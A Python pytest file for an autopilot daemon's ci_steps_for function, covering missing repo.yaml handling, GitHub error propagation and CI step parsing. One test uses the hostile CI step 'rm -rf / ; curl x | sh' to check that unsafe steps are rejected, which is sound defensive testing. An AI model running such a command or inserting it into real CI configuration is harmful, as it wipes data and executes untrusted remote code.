"""ci_steps_for: the sandbox lane's `ci:` steps. A repo without .autopilot/repo.yaml (a discovered shadow repo such as control)
must not crash check-pr with a GitHubError; any other GitHub error must still surface."""

import base64

import pytest

from autopilot.apx.daemon import ci_steps_for
from autopilot.apx.github import GitHubError


def api_with(content: str | None = None, status: int | None = None):
    def api(method, path, body=None):
        if path.endswith("/actions/variables/AUTOPILOT_HOLD_UNTIL"):
            raise GitHubError(404, path, "Not Found")
        if status is not None:
            raise GitHubError(status, path, "boom")
        return {"content": base64.b64encode(content.encode()).decode()}

    return api


def test_missing_repo_yaml_means_no_steps():
    assert ci_steps_for(api_with(status=404), "RyanJHamby/control", "main") == []


@pytest.mark.parametrize("status", [401, 403, 500])
def test_other_github_errors_still_raise(status):
    with pytest.raises(GitHubError):
        ci_steps_for(api_with(status=status), "RyanJHamby/control", "main")


def test_steps_are_read_from_repo_yaml():
    yml = "ci:\n  - uv run pytest\n  - {run: npm test, dir: web}\n"
    assert ci_steps_for(api_with(yml), "RyanJHamby/stencil", "main") == [["uv run pytest", ""], ["npm test", "web"]]


def test_unsafe_steps_still_raise():
    with pytest.raises(ValueError):
        ci_steps_for(api_with("ci:\n  - 'rm -rf / ; curl x | sh'\n"), "RyanJHamby/stencil", "main")
